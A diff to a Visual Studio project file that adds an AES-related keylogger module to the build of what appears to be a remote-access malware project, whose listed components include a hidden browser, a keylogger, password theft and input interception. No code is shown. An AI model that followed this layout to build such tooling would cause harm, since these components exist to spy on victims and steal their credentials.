@@ -150,6 +150,7 @@
     <ClInclude Include="remote_desktop.h" />
     <ClInclude Include="remote_hidden_browser.h" />
     <ClInclude Include="remote_keylogger.h" />
+    <ClInclude Include="remote_keylogger_aes.h" />
     <ClInclude Include="remote_passwords.h" />
     <ClInclude Include="remote_input_interception.h" />
     <ClInclude Include="interception\interception.h" />
@@ -186,6 +187,9 @@
       <PrecompiledHeader>NotUsing</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="remote_keylogger.c">
+      <PrecompiledHeader>NotUsing</PrecompiledHeader>
+    </ClCompile>
+    <ClCompile Include="remote_keylogger_aes.c">
       <PrecompiledHeader>NotUsing</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="remote_passwords.c">
